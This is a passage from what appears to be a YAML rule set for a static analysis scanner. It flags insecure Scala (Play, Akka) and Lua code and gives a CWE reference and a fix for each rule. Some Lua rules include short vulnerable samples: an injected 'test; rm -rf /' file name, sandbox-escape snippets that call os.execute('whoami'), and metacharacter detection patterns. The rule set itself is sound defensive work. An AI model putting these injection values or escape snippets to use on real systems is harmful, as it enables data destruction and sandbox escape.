  \ security headers in application.conf:\n```scala\nplay.filters.enabled += \"play.filters.headers.SecurityHeadersFilter\"\
  \nplay.filters.headers {\n  contentSecurityPolicy = \"default-src 'self'\"\n  frameOptions\
  \ = \"DENY\"\n  xssProtection = \"1; mode=block\"\n  contentTypeOptions = \"nosniff\"\
  \n}\n```\n"
---
id: scala-cwe-614-cookie-secure-flag
language: scala
severity: warning
message: 'CWE-614: Sensitive Cookie Without Secure Flag'
tags:
- security
- play-framework
- CWE-614
- OWASP-A01
rule:
  kind: object_creation
  pattern: Cookie\($NAME, $VALUE\) | .withCookies\(Cookie\($NAME, $VALUE\)\)
note: 'Cookies without the Secure flag can be transmitted over HTTP.


  Use secure and httpOnly flags:

  ```scala

  Cookie(name = "session", value = token, secure = true, httpOnly = true)

  ```

  '
---
id: scala-cwe-384-session-fixation
language: scala
severity: warning
message: 'CWE-384: Session Fixation - No session regeneration after login'
tags:
- security
- authentication
- CWE-384
- OWASP-A01
rule:
  kind: method_call
  pattern: request.session.get\(\"sessionId\"\)
note: "Failing to regenerate session ID after authentication enables session fixation.\n\
  \nRegenerate session after login:\n```scala\ndef login(credentials: Credentials)\
  \ = Action { request =>\n  if (valid) {\n    val newSession = request.session +\
  \ (\"userId\" -> user.id.toString)\n    Redirect(\"/dashboard\").withNewSession.withSession(newSession.data.toSeq:\
  \ _*)\n  }\n}\n```\n"
---
id: scala-cwe-532-sensitive-data-logs
language: scala
severity: warning
message: 'CWE-532: Log File Data Leak - Sensitive data in logs'
tags:
- security
- logging
- CWE-532
- OWASP-A09
rule:
  kind: method_call
  pattern: 'logger.info\(s\"User password: $password\"\) | Logger.debug\(s\"Credit
    card: $cardNumber\"\) | log.info\(request.body.toString\)'
note: 'Logging sensitive data exposes it in log files.


  Never log passwords, tokens, or credit cards:

  ```scala

  logger.info(s"User ${user.id} logged in")

  ```

  '
---
id: scala-sec-046-akka-remote-no-tls
language: scala
severity: warning
message: 'Akka Security: Remote communication without TLS'
tags:
- security
- akka
- OWASP-A02
rule:
  kind: configuration
  pattern: akka.remote.artery.transport = tcp | akka.remote.artery.ssl.enabled = false
    | akka.remote.netty.tcp
note: "Akka remoting without TLS exposes messages to interception.\n\nEnable TLS in\
  \ application.conf:\n```scala\nakka.remote.artery {\n  transport = tls-tcp\n  ssl.enabled\
  \ = true\n}\n```\n"
---
id: scala-sec-047-akka-cors-wildcard
language: scala
severity: warning
message: 'Akka Security: CORS misconfiguration with wildcard'
tags:
- security
- akka
- OWASP-A01
rule:
  kind: configuration
  pattern: '`Access-Control-Allow-Origin` -> \"*\" | CorsSettings.defaultSettings.withAllowedOrigins\(HttpOriginRange.*\)'
note: "Wildcard CORS allows any origin to make authenticated requests.\n\nConfigure\
  \ CORS with specific origins:\n```scala\nval corsSettings = CorsSettings.defaultSettings\n\
  \  .withAllowedOrigins(HttpOriginRange(\n    HttpOrigin(\"https://example.com\"\
  )\n  ))\n```\n"
---
id: scala-sec-048-akka-cluster-unprotected
language: scala
severity: warning
message: 'Akka Security: Unprotected Akka Cluster'
tags:
- security
- akka
- OWASP-A01
rule:
  kind: configuration
  pattern: akka.cluster.seed-nodes = \[$PUBLIC_IPS\]
note: 'Akka clusters without authentication can be joined by malicious nodes.


  Enable cluster cookie authentication in application.conf:

  ```scala

  akka.remote.require-cookie = on

  akka.remote.secure-cookie = "YOUR_SECURE_COOKIE"

  ```

  '
---
id: scala-cwe-330-insecure-random
language: scala
severity: warning
message: 'CWE-330: Insufficient Randomness - java.util.Random for security'
tags:
- security
- random
- CWE-330
- OWASP-A02
rule:
  kind: object_creation
  pattern: scala.util.Random | java.util.Random | new Random\(\) | Random.nextInt\(\)
    | Random.nextBytes\($ARRAY\)
note: 'java.util.Random is predictable and unsuitable for security purposes.


  Use SecureRandom:

  ```scala

  import java.security.SecureRandom


  val secureRandom = new SecureRandom()

  val token = new Array[Byte](32)

  secureRandom.nextBytes(token)

  ```

  '
---
id: scala-cwe-330-predictable-token
language: scala
severity: warning
message: 'CWE-330: Insufficient Randomness - Predictable token generation'
tags:
- security
- random
- CWE-330
- OWASP-A02
rule:
  kind: method_call
  pattern: UUID.randomUUID\(\) | System.currentTimeMillis\(\).toString | hashCode\(\).toString
note: "UUID v4 and timestamps are not suitable for security tokens.\n\nUse SecureRandom\
  \ for token generation:\n```scala\nimport java.security.SecureRandom\nimport java.util.Base64\n\
  \ndef generateSecureToken(length: Int = 32): String = {\n  val random = new SecureRandom()\n\
  \  val bytes = new Array[Byte](length)\n  random.nextBytes(bytes)\n  Base64.getUrlEncoder.withoutPadding.encodeToString(bytes)\n\
  }\n```\n"
---
id: scala-cwe-209-error-message-leak
language: scala
severity: warning
message: 'CWE-209: Information Exposure Through Error Message'
tags:
- security
- sensitive-data
- CWE-209
- OWASP-A01
rule:
  kind: method_call
  pattern: throw new Exception\(s\"Failed for user $password\"\) | throw new RuntimeException\(sensitiveData.toString\)
note: 'Exceptions with sensitive data may be logged or displayed to users.


  Use generic messages:

  ```scala

  throw new AuthenticationException("Invalid credentials")

  // Log sensitive details separately at appropriate level

  logger.debug(s"Auth failure for user: ${user.id}")

  ```

  '
---
id: scala-cwe-200-tostring-sensitive-data
language: scala
severity: warning
message: 'CWE-200: Information Exposure - Sensitive data in toString'
tags:
- security
- sensitive-data
- CWE-200
- OWASP-A01
rule:
  kind: class_definition
  pattern: 'case class User\(name: String, password: String\)'
note: "Default case class toString includes all fields, potentially exposing secrets.\n\
  \nOverride toString to redact sensitive fields:\n```scala\ncase class User(name:\
  \ String, password: String) {\n  override def toString: String = s\"User($name,\
  \ [REDACTED])\"\n}\n```\n"
---
id: scala-pci-unmasked-credit-card
language: scala
severity: warning
message: 'PCI DSS: Unmasked credit card number'
tags:
- security
- sensitive-data
- PCI-DSS
- OWASP-A01
rule:
  kind: variable_assignment
  pattern: 'logger.info\(s\"Card: $cardNumber\"\) | CardDetails\(number = rawCardNumber\)'
note: "Credit card numbers should be masked in logs and storage.\n\nMask card numbers:\n\
  ```scala\ndef maskCard(number: String): String = {\n  \"*\" * (number.length - 4)\
  \ + number.takeRight(4)\n}\n```\n"
---
id: scala-cwe-208-timing-attack
language: scala
severity: warning
message: 'CWE-208: Observable Timing Discrepancy - Password comparison'
tags:
- security
- authentication
- CWE-208
- OWASP-A02
rule:
  kind: binary_operation
  pattern: storedHash == providedHash | password.equals\(expected\) | Arrays.equals\($HASH1,
    $HASH2\)
note: 'String comparison short-circuits on first mismatch, enabling timing attacks.


  Use constant-time comparison:

  ```scala

  import java.security.MessageDigest


  MessageDigest.isEqual(hash1, hash2)

  ```

  '
---
id: scala-cwe-256-plain-text-password
language: scala
severity: error
message: 'CWE-256: Plaintext Storage of Password'
tags:
- security
- authentication
- CWE-256
- CWE-327
- OWASP-A02
rule:
  kind: variable_assignment
  pattern: user.password = rawPassword | INSERT INTO users \(password\) VALUES \($RAW_PASSWORD\)
note: 'Storing plain text passwords exposes them in case of data breach.


  Use bcrypt or Argon2:

  ```scala

  import org.mindrot.jbcrypt.BCrypt


  val hashedPassword = BCrypt.hashpw(password, BCrypt.gensalt(12))

  // Verify

  BCrypt.checkpw(providedPassword, storedHash)

  ```

  '
---
id: scala-cwe-327-weak-password-hash
language: scala
severity: warning
message: 'CWE-327: Use of Broken Cryptographic Algorithm - Weak password hashing'
tags:
- security
- authentication
- CWE-327
- OWASP-A02
rule:
  kind: method_call
  pattern: MessageDigest.getInstance\(\"SHA-256\"\).digest\(password.getBytes\) |
    DigestUtils.sha256Hex\(password\)
note: 'Simple hashing without salt and key stretching is vulnerable to rainbow tables.


  Use bcrypt, scrypt, or Argon2:

  ```scala

  import org.mindrot.jbcrypt.BCrypt

  BCrypt.hashpw(password, BCrypt.gensalt(12))

  ```

  '
---
id: scala-cwe-347-jwt-secret-hardcoded
language: scala
severity: error
message: 'CWE-347: Improper Verification of Cryptographic Signature - JWT secret in
  code'
tags:
- security
- authentication
- CWE-347
- OWASP-A02
rule:
  kind: variable_assignment
  pattern: JwtJson.encode\($CLAIM, \"$LITERAL_SECRET\", JwtAlgorithm.HS256\) | Jwt.decode\($TOKEN,
    \"$LITERAL_KEY\"\) | val secret = \"my-jwt-secret\"
note: 'JWT secrets should be managed externally, not hardcoded.


  Load from environment:

  ```scala

  val secret = sys.env("JWT_SECRET")

  JwtJson.encode(claim, secret, JwtAlgorithm.HS256)

  ```

  '
---
id: scala-cwe-347-jwt-none-algorithm
language: scala
severity: error
message: 'CWE-347: Improper Verification of Cryptographic Signature - JWT none algorithm'
tags:
- security
- authentication
- CWE-347
- OWASP-A02
rule:
  kind: constant
  pattern: JwtAlgorithm.none | Jwt.decode\($TOKEN\)
note: 'The "none" algorithm allows unsigned tokens, bypassing authentication.


  Always verify algorithm:

  ```scala

  Jwt.decode(token, secret, Seq(JwtAlgorithm.HS256))

  ```

  '
---
id: scala-cwe-117-log-injection
language: scala
severity: warning
message: 'CWE-117: Improper Output Neutralization for Logs - Log forging'
tags:
- security
- logging
- CWE-117
- OWASP-A09
rule:
  kind: method_call
  pattern: 'logger.info\(s\"User action: $userInput\"\) | log.debug\(request.body.asText.get\)'
note: "Newlines in log messages can forge log entries or inject malicious content.\n\
  \nSanitize user input for logs:\n```scala\ndef sanitizeForLog(input: String): String\
  \ = {\n  input.replaceAll(\"[\\\\r\\\\n]\", \" \")\n}\n\nlogger.info(s\"User action:\
  \ ${sanitizeForLog(userInput)}\")\n```\n"
---
id: scala-cwe-470-unsafe-reflection
language: scala
severity: warning
message: 'CWE-470: Use of Externally-Controlled Input to Select Classes or Code'
tags:
- security
- reflection
- CWE-470
- OWASP-A03
rule:
  kind: method_call
  pattern: Class.forName\($USER_INPUT\) | classLoader.loadClass\($USER_INPUT\) | $CLASS.getDeclaredMethod\($USER_INPUT\)
    | $CLASS.getMethod\($USER_INPUT\)
note: "Loading classes or invoking methods based on user input enables code execution.\n\
  \nUse allowlist:\n```scala\nval allowedClasses = Set(\"com.example.Safe1\", \"com.example.Safe2\"\
  )\nif (allowedClasses.contains(className)) {\n  Class.forName(className)\n}\n```\n"
---
id: scala-cwe-78-runtime-exec-shell
language: scala
severity: warning
message: 'CWE-78: OS Command Injection - Runtime.exec with shell wrapper'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03
rule:
  kind: method_call
  pattern: Runtime.getRuntime.exec\(Array\(\"sh\", \"-c\", $COMMAND\)\) | Runtime.getRuntime.exec\(Array\(\"cmd\",
    \"/c\", $COMMAND\)\)
note: 'Passing commands through shell enables injection.


  Pass arguments directly without shell:

  ```scala

  Runtime.getRuntime.exec(Array("program", "arg1", "arg2"))

  ```

  '
---
id: scala-cwe-79-unsafe-html-output
language: scala
severity: warning
message: 'CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: method_call
  pattern: Html\($USER_INPUT\) | Html\(s\"<div>$userContent</div>\"\) | @Html\(variable\)
note: 'Rendering user input as HTML enables XSS attacks.


  Use HTML escaping:

  ```scala

  import play.twirl.api.HtmlFormat

  HtmlFormat.escape(userContent)


  // In templates, use @variable instead of @Html(variable)

  ```

  '
---
id: scala-cwe-79-javascript-injection
language: scala
severity: warning
message: 'CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
  - JavaScript context'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: string_interpolation
  pattern: 'Ok\\(s\\\"callback\\($userInput\\)\\\"\\) | s\\\"<script>var data = ''$userInput'';</script>\\\"

    '
note: 'User input in JavaScript context enables XSS.


  Escape for JavaScript context:

  ```scala

  import org.apache.commons.text.StringEscapeUtils

  val safeInput = StringEscapeUtils.escapeEcmaScript(userInput)

  Ok(s"callback(''$safeInput'')")

  ```

  '
---
id: scala-cwe-94-template-injection
language: scala
severity: error
message: 'CWE-94: Improper Control of Generation of Code - Template injection'
tags:
- security
- code-injection
- CWE-94
- OWASP-A03
rule:
  kind: method_call
  pattern: engine.render\($USER_TEMPLATE\) | Twirl.compile\($USER_INPUT\) | StringTemplate\($USER_INPUT\)
note: 'Server-side template injection enables code execution.


  Never use user input as templates:

  ```scala

  val template = "Hello, {{name}}"

  render(template, Map("name" -> userInput))

  ```

  '
---
id: scala-wart-return
language: scala
severity: info
message: 'WartRemover: Return statement usage'
tags:
- scala
- code-quality
rule:
  kind: return_statement
  pattern: return
note: "Return statements can be confusing in nested closures and may not work as expected.\n\
  \nUse expression-based returns:\n```scala\ndef process(): Int = {\n  if (condition)\
  \ 0 else 1\n}\n```\n"
---
id: scala-wart-null
language: scala
severity: warning
message: 'WartRemover: Null usage'
tags:
- scala
- code-quality
rule:
  kind: literal
  pattern: 'null'
note: "Null values lead to NullPointerExceptions; use Option instead.\n\nUse Option\
  \ types:\n```scala\nval x: Option[String] = None\nobj match {\n  case Some(value)\
  \ => ...\n  case None => ...\n}\n```\n"
---
id: scala-wart-asinstanceof
language: scala
severity: warning
message: 'WartRemover: asInstanceOf usage'
tags:
- scala
- code-quality
rule:
  kind: method_call
  pattern: .asInstanceOf\[TargetType\]
note: "Unsafe casts can fail at runtime; use pattern matching instead.\n\nUse pattern\
  \ matching:\n```scala\nobj match {\n  case t: TargetType => // use t\n  case _ =>\
  \ // handle other cases\n}\n```\n"
---
id: scala-wart-isinstanceof
language: scala
severity: info
message: 'WartRemover: isInstanceOf without pattern match'
tags:
- scala
- code-quality
rule:
  kind: conditional
  pattern: if \(obj.isInstanceOf\[Type\]\) \{ obj.asInstanceOf\[Type\] \}
note: "This pattern is error-prone; use pattern matching.\n\nUse pattern matching:\n\
  ```scala\nobj match {\n  case t: Type => // use t\n  case _ => // other\n}\n```\n"
---
id: scala-wart-any
language: scala
severity: info
message: 'WartRemover: Any/AnyRef usage'
tags:
- scala
- code-quality
rule:
  kind: type_annotation
  pattern: 'def process\(input: Any\): Any | val map: Map\[String, Any\]'
note: 'Using Any defeats type safety; use specific types or generics.


  Use specific types:

  ```scala

  def process[T](input: T): Result[T]

  sealed trait Value

  case class StringValue(s: String) extends Value

  ```

  '
---
id: lua-cwe-94-loadstring-with-user-input
language: lua
severity: error
message: 'CWE-94: loadstring compiles and executes untrusted user input as Lua code'
tags:
- security
- code-injection
- CWE-94
- OWASP-CodeInjection
rule:
  kind: function_call
  pattern: loadstring($EXPR)
note: "loadstring() takes a string and compiles it as Lua code, returning an executable\
  \ function.\nUsing unsanitized user input enables arbitrary code execution.\n\n\
  Vulnerable pattern:\n  local code = user_input\n  local func = loadstring(code)\n\
  \  func()\n\nRemediation:\n- NEVER use loadstring with user input\n- Use structured\
  \ data formats instead (JSON, MessagePack)\n- If dynamic code is necessary, use\
  \ restricted environments with sandboxing\n"
---
id: lua-cwe-94-load-with-user-input
language: lua
severity: error
message: 'CWE-94: load() executes untrusted user input as Lua code (Lua 5.2+)'
tags:
- security
- code-injection
- CWE-94
- OWASP-CodeInjection
rule:
  kind: function_call
  pattern: load($EXPR)
note: "load() is the Lua 5.2+ replacement for loadstring with identical security risks.\n\
  Compiles and returns a function from user-provided code.\n\nVulnerable pattern:\n\
  \  local chunk = load(request.body)\n  chunk()\n\nRemediation:\n- Validate all inputs\n\
  - Use structured data parsing\n- Never execute user input as code\n- Consider using\
  \ require() only for known, whitelisted modules\n"
---
id: lua-cwe-94-load-binary-mode
language: lua
severity: error
message: 'CWE-94: load() with binary mode allows execution of malicious bytecode'
tags:
- security
- code-injection
- CWE-94
- CVE-2014-5461
rule:
  kind: function_call
  pattern: load($CHUNK, $NAME, "[b|bt]")
note: "Binary mode (\"b\" or \"bt\") allows load() to execute precompiled Lua bytecode.\n\
  This can bypass security checks and include malicious payloads.\n\nVulnerable pattern:\n\
  \  local chunk = load(file_contents, \"chunk\", \"b\")\n\nRemediation:\n- Only use\
  \ text mode (\"t\") for untrusted input\n- Never load binary chunks from untrusted\
  \ sources\n- Validate bytecode source and integrity if loading is necessary\n- Consider\
  \ disabling binary mode entirely in sandboxes\n"
---
id: lua-cwe-98-dofile-with-user-path
language: lua
severity: error
message: 'CWE-98: dofile() executes arbitrary files if path is user-controlled'
tags:
- security
- path-traversal
- CWE-98
- OWASP-PathTraversal
rule:
  kind: function_call
  pattern: dofile($PATH)
note: "dofile() executes a Lua file directly. If the path is controllable by an attacker,\n\
  arbitrary Lua scripts can be executed.\n\nVulnerable pattern:\n  local config_file\
  \ = user_provided_path\n  dofile(config_file)\n\nRemediation:\n- Validate paths\
  \ against a whitelist\n- Use absolute, canonical paths\n- Never accept user-provided\
  \ file paths directly\n- Normalize paths and reject \"..\" components\n- Use configurable\
  \ file paths from trusted sources only\n"
---
id: lua-cwe-22-loadfile-with-user-path
language: lua
severity: error
message: 'CWE-22: loadfile() returns function from file with user-controlled path'
tags:
- security
- path-traversal
- CWE-22
- OWASP-PathTraversal
rule:
  kind: function_call
  pattern: loadfile($PATH)
note: "loadfile() is similar to dofile() but returns a function instead of executing\
  \ immediately.\nSame path traversal and code execution risks apply.\n\nVulnerable\
  \ pattern:\n  local chunk = loadfile(\"scripts/\" .. user_input .. \".lua\")\n\n\
  Remediation:\n- Sanitize and validate file paths\n- Use whitelisting approach\n\
  - Avoid concatenating user input into file paths\n- Use canonical path resolution\
  \ and reject traversal attempts\n- Implement proper access controls per file\n"
---
id: lua-cwe-829-require-dynamic-module
language: lua
severity: warning
message: 'CWE-829: Dynamic require() with user-controlled module names can load unintended
  modules'
tags:
- security
- inclusion
- CWE-829
- OWASP-SupplyChain
rule:
  kind: function_call
  pattern: require($DYNAMIC_STRING)
note: "require() loads Lua modules by name. If the module name is user-controlled,\n\
  attackers may load unintended or malicious modules from the module path.\n\nVulnerable\
  \ pattern:\n  local module_name = user_input\n  local mod = require(module_name)\n\
  \nRemediation:\n- Use whitelist of allowed module names\n- Validate module names\
  \ against known modules\n- Never use user input directly as module names\n- Consider\
  \ using a module registry pattern\n- Control the module search path (package.path)\n"
---
id: lua-cwe-78-os-execute-command-injection
language: lua
severity: error
message: 'CWE-78: os.execute() with user input enables shell command injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-CommandInjection
rule:
  kind: function_call
  pattern: os.execute($CMD)
note: "os.execute() executes a shell command. User input in the command string\nenables\
  \ command injection attacks.\n\nVulnerable pattern:\n  os.execute(\"grep \" .. user_query\
  \ .. \" file.txt\")\n\nRemediation:\n- Avoid shell execution when possible\n- Use\
  \ parameterized/safer alternatives\n- Sanitize user input aggressively\n- Never\
  \ concatenate user input into commands\n- Use libraries that support argument separation\n\
  - Escape all shell metacharacters: ; | & $ ` \" ' < > ( ) { } [ ] ! # ~ *\n- Consider\
  \ using alternative APIs for the specific task\n"
---
id: lua-cwe-78-io-popen-command-injection
language: lua
severity: error
message: 'CWE-78: io.popen() with user input enables shell command injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-CommandInjection
rule:
  kind: function_call
  pattern: io.popen($CMD)
note: "io.popen() opens a process for reading/writing. Command injection is possible\n\
  if user input is not properly validated.\n\nVulnerable pattern:\n  local handle\
  \ = io.popen(\"ls \" .. directory)\n\nRemediation:\n- Validate input strictly\n\
  - Use safe alternatives when possible\n- Avoid shell metacharacters in all inputs\n\
  - Never concatenate user input into commands\n- Escape or reject special characters\n\
  - Use absolute paths for commands\n"
---
id: lua-cwe-78-shell-metacharacter-injection
language: lua
severity: error
message: 'CWE-78: Shell metacharacters in os.execute or io.popen can chain commands'
tags:
- security
- command-injection
- CWE-78
- OWASP-CommandInjection
rule:
  kind: pattern
  pattern: (os\.execute|io\.popen)\([^)]*[;|&$`<>(){}\[\]!#~*][^)]*\)
note: "Shell metacharacters can be used to chain multiple commands or escape the intended\n\
  command. These include: ; | & $ ` \" ' < > ( ) { } [ ] ! # ~ *\n\nVulnerable pattern:\n\
  \  os.execute(\"cat \" .. filename)  # if filename = \"test; rm -rf /\"\n\nRemediation:\n\
  - Reject or escape ALL shell metacharacters\n- Prefer using APIs that don't use\
  \ shell (e.g., spawn processes directly)\n- Validate against whitelist of acceptable\
  \ characters\n- Use constant commands with parameterized arguments\n- Test with\
  \ malicious inputs containing metacharacters\n"
---
id: lua-cwe-426-os-execute-path-traversal
language: lua
severity: warning
message: 'CWE-426: os.execute() with relative command paths can be hijacked via PATH'
tags:
- security
- path-hijacking
- CWE-426
- OWASP-PathTraversal
rule:
  kind: function_call
  pattern: 'os\.execute\("(?!/).*"\)

    '
note: "Relative command paths can be hijacked if an attacker controls the PATH environment.\n\
  An attacker could place a malicious executable in a PATH directory.\n\nVulnerable\
  \ pattern:\n  os.execute(\"python script.py\")  -- Attacker could put malicious\
  \ 'python' in PATH\n\nRemediation:\n- Always use absolute paths to executables\n\
  - Validate executable paths before execution\n- Never rely on PATH for security-critical\
  \ commands\n- Use full path like /usr/bin/python, /bin/ls, etc.\n- Control PATH\
  \ environment variable if possible\n"
---
id: lua-cwe-200-debug-getinfo-exposure
language: lua
severity: warning
message: 'CWE-200: debug.getinfo() exposes function metadata and source locations'
tags:
- security
- information-disclosure
- CWE-200
- debug-library
rule:
  kind: function_call
  pattern: 'debug\.getinfo\(

    '
note: "debug.getinfo() returns metadata about functions including source file, line\
  \ numbers,\nand upvalue information. This leaks implementation details.\n\nVulnerable\
  \ pattern:\n  local info = debug.getinfo(secret_function)\n  print(info.source,\
  \ info.linedefined)\n\nRemediation:\n- Remove or sandbox debug library in production\n\
  - Set debug = nil in untrusted environments\n- Disable debug library in game engines\
  \ and sandboxes\n- Keep implementation details private\n"
---
id: lua-cwe-668-debug-upvalue-manipulation
language: lua
severity: error
message: 'CWE-668: debug.getupvalue/setupvalue allows breaking encapsulation'
tags:
- security
- encapsulation-bypass
- CWE-668
- debug-library
rule:
  kind: function_call
  pattern: 'debug\.(get|set)upvalue\(

    '
note: "debug.getupvalue() and debug.setupvalue() allow reading and modifying closure\n\
  upvalues, breaking encapsulation and potentially modifying security-critical state.\n\
  \nVulnerable pattern:\n  local name, value = debug.getupvalue(secure_function, 1)\n\
  \  debug.setupvalue(secure_function, 1, malicious_value)\n\nRemediation:\n- Remove\
  \ debug library in production sandboxes\n- Disable debug library completely in untrusted\
  \ environments\n- Never expose functions with sensitive closures to untrusted code\n\
  - Use metatables with __metatable protection instead\n"
---
id: lua-cwe-668-debug-setmetatable-sandbox-escape
language: lua
severity: error
message: 'CWE-668: debug.setmetatable() can bypass sandbox by modifying metatables'
tags:
- security
- sandbox-escape
- CWE-668
- debug-library
rule:
  kind: function_call
  pattern: 'debug\.setmetatable\(

    '
note: "debug.setmetatable() allows modifying metatables of any value, including protected\
  \ ones.\nThis can completely bypass sandbox restrictions.\n\nVulnerable pattern:\n\
  \  debug.setmetatable(\"\", {__index = function() os.execute(\"whoami\") end})\n\
  \nRemediation:\n- Remove debug library completely in untrusted environments\n- Never\
  \ expose debug.setmetatable to sandboxed code\n- Protect string metatable with __metatable\
  \ field\n- Validate that metatables cannot be modified\n"
---
id: lua-cwe-200-debug-sethook-dos
language: lua
severity: warning
message: 'CWE-200: debug.sethook() can intercept all function calls enabling DoS/info
  theft'
tags:
- security
- information-disclosure
- denial-of-service
- CWE-200
- debug-library
rule:
  kind: function_call
  pattern: 'debug\.sethook\(

    '
note: "debug.sethook() can intercept every function call, return, and line execution.\n\
  This enables denial of service or information theft through spy hooks.\n\nVulnerable\
  \ pattern:\n  debug.sethook(function(event)\n      print(debug.getinfo(2).name)\n\
  \  end, \"c\")\n\nRemediation:\n- Disable debug library in production\n- Prevent\
  \ untrusted code from setting hooks\n- Monitor for hook installations\n- Use debug\
  \ = nil in sandboxes\n"
---
id: lua-cwe-668-debug-getlocal-scope-bypass
language: lua
severity: warning
message: 'CWE-668: debug.getlocal/setlocal breaks scope isolation between stack frames'
tags:
- security
- scope-violation
- CWE-668
- debug-library
rule:
  kind: function_call
  pattern: 'debug\.(get|set)local\(

    '
note: "debug.getlocal() and debug.setlocal() allow access and modification of local\n\
  variables in any stack frame, breaking scope isolation.\n\nVulnerable pattern:\n\
  \  debug.setlocal(2, 1, \"hacked\")\n\nRemediation:\n- Remove debug library access\
  \ in production\n- Prevent untrusted code from accessing debug library\n- Use local\
  \ variables with proper scope management\n- Consider using closures for private\
  \ state\n"
---
id: lua-cwe-200-debug-getregistry-disclosure
language: lua
severity: warning
message: 'CWE-200: debug.getregistry() exposes internal Lua state and C references'
tags:
- security
- information-disclosure
- CWE-200
- debug-library
rule:
  kind: function_call
  pattern: 'debug\.getregistry\(\)

    '
note: "debug.getregistry() returns the Lua registry containing internal references\n\
  and potentially sensitive C data and internal structures.\n\nVulnerable pattern:\n\
  \  local reg = debug.getregistry()\n  -- Can access internal Lua state\n\nRemediation:\n\
  - Sandbox debug library in untrusted environments\n- Prevent access to registry\n\
  - Monitor for registry access attempts\n- Use debug = nil in sandboxes\n"
---
id: lua-cwe-209-debug-traceback-info-leak
language: lua
severity: info
message: 'CWE-209: Stack traces may reveal file paths, function names, and internal
  structure'
tags:
- security
- information-disclosure
- CWE-209
rule:
  kind: function_call
  pattern: 'debug\.traceback\(\)

    '
note: "Stack traces from debug.traceback() may reveal file paths, function names,\n\
  and internal structure of the application.\n\nVulnerable pattern:\n  print(\"Error:\
  \ \" .. debug.traceback())\n\nRemediation:\n- Log traceback internally for debugging\n\
  - Return generic error messages to users\n- Never expose stack traces in user-facing\
  \ output\n- Sanitize error messages in production\n"
---
id: lua-cwe-265-global-environment-sandbox-escape
language: lua
severity: error
message: 'CWE-265: Direct access to _G in sandbox can escape restrictions'
tags:
- security
- sandbox-escape
- CWE-265
- privilege-escalation
rule:
  kind: variable_access
  pattern: _G
note: "_G provides access to the global environment table, which may contain dangerous\n\
  libraries like os, io, and debug if the sandbox doesn't restrict them.\n\nVulnerable\
  \ pattern:\n  local real_os = _G.os\n  real_os.execute(\"whoami\")\n\nRemediation:\n\
  - Replace _G with restricted environment (Lua 5.1: setfenv, Lua 5.2+: _ENV)\n- Create\
  \ a sandbox with controlled globals\n- Remove dangerous libraries from global scope\n\
  - Use getfenv()/setfenv() carefully in Lua 5.1\n- Use _ENV properly in Lua 5.2+\n"
---
id: lua-cwe-265-getfenv-setfenv-sandbox-escape
language: lua
severity: error
message: 'CWE-265: getfenv/setfenv (Lua 5.1) can escape sandbox by accessing caller
  environment'
tags:
- security
- sandbox-escape
- CWE-265
- privilege-escalation
rule:
  kind: function_call
  pattern: '(get|set)fenv\(

    '
note: "getfenv() and setfenv() (Lua 5.1) allow retrieval and modification of function\n\
  environments, enabling sandbox escape.\n\nVulnerable pattern:\n  local env = getfenv(2)\n\
  \  env.os.execute(\"whoami\")\n\nRemediation:\n- Remove these functions from Lua\
  \ 5.1 sandboxes\n- Upgrade to Lua 5.2+ and use _ENV instead\n- Ensure functions\
  \ cannot modify their own environment\n- Use custom implementations if environment\
  \ control is needed\n"
---
id: lua-cwe-284-rawget-rawset-metatable-bypass
language: lua
severity: warning
message: 'CWE-284: rawget/rawset bypass __index/__newindex metamethods'
tags:
- security
- access-control-bypass
- CWE-284
rule:
  kind: function_call
  pattern: '(rawget|rawset)\(

    '
note: "rawget() and rawset() bypass __index and __newindex metamethods, potentially\n\
  circumventing access controls that rely on metatables.\n\nVulnerable pattern:\n\
  \  rawset(protected_table, \"secret\", \"hacked\")\n\nRemediation:\n- Control access\
  \ to rawget/rawset in sandboxes\n- Protect sensitive tables with __metatable field\n\
  - Never rely solely on metatables for security\n- Use closures or other encapsulation\
  \ mechanisms\n- Prevent untrusted code from accessing these functions\n"
---
id: lua-cwe-200-getmetatable-exposure
language: lua
severity: warning
message: 'CWE-200: getmetatable() can expose and enable manipulation of metatables'
tags:
- security
- information-disclosure
- CWE-200
rule:
  kind: function_call
  pattern: 'getmetatable\(

    '
note: "getmetatable() returns the metatable of an object. This can expose metatable\n\
  internals and enable modification of metamethods.\n\nVulnerable pattern:\n  local\
  \ mt = getmetatable(secure_object)\n  mt.__index = function() return \"hacked\"\
  \ end\n\nRemediation:\n- Set __metatable field to hide/protect metatables\n- Use\
  \ debug.setmetatable prevention\n- Prevent access to sensitive object metatables\n\
  - Store metatables privately if possible\n"
---
id: lua-cwe-668-string-metatable-manipulation
language: lua
severity: error
message: 'CWE-668: String metatable modification affects ALL string operations globally'
tags:
- security
- sandbox-escape
- CWE-668
rule:
  kind: pattern
  pattern: 'getmetatable\(""\)

    '
note: "All strings share a single metatable. Modifying it affects ALL string operations\n\
  globally, enabling wide-scale sandbox escapes.\n\nVulnerable pattern:\n  getmetatable(\"\
  \").__index = function(s, k)\n      os.execute(\"whoami\")\n  end\n\nRemediation:\n\
  - Protect string metatable with __metatable field\n- Remove debug.setmetatable from\
  \ sandboxes\n- Use read-only string metatable where possible\n- Monitor metatable\
  \ modifications\n"
---
id: lua-cwe-829-package-searchers-manipulation
language: lua
severity: error
message: 'CWE-829: Modifying package.searchers/loaders can inject malicious module
  loaders'
tags:
- security
- inclusion
- CWE-829
- OWASP-SupplyChain
rule:
  kind: variable_access
  pattern: 'package\.(searchers|loaders)

    '
note: "package.searchers (Lua 5.2+) or package.loaders (Lua 5.1) controls how require()\n\
  finds modules. Modifying these can inject malicious loaders.\n\nVulnerable pattern:\n\
  \  table.insert(package.searchers, 1, function(modname)\n      return function()\
  \ os.execute(\"whoami\") end\n  end)\n\nRemediation:\n- Freeze or sandbox package\
  \ loading mechanisms\n- Prevent modification of searchers/loaders\n- Use whitelist\
  \ of allowed modules\n- Control package.path and package.cpath\n- Validate module\
  \ sources\n"
---
id: lua-cwe-114-package-loadlib-c-code
language: lua
severity: error
message: 'CWE-114: package.loadlib() loads C functions, bypassing Lua sandbox entirely'
tags:
- security
- process-control
- CWE-114
rule:
  kind: function_call
  pattern: 'package\.loadlib\(

    '
note: "package.loadlib() loads C functions from shared libraries (.so, .dll, etc.),\n\
